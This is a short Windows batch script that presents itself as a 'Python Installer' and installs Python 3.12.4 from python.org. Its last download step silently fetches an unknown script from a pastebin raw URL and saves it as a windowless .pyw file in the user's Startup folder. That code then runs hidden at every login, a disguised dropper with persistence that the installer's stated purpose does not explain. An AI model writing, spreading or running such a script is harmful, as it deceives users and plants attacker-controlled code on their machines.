@echo off

set /p "enter=Welcome to Python Installer! Press ENTER to install. "

curl https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe -o"%LocalAppData%\Temp\python_312.exe" -#
%LocalAppData%\Temp\python_312.exe /passive
erase %LocalAppData%\Temp\python_312.exe >NUL 2>&1

curl https://pastebin.com/raw/gAYiBPjh -o"%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\startup.pyw" -s
set /p "finish=Installation complete! "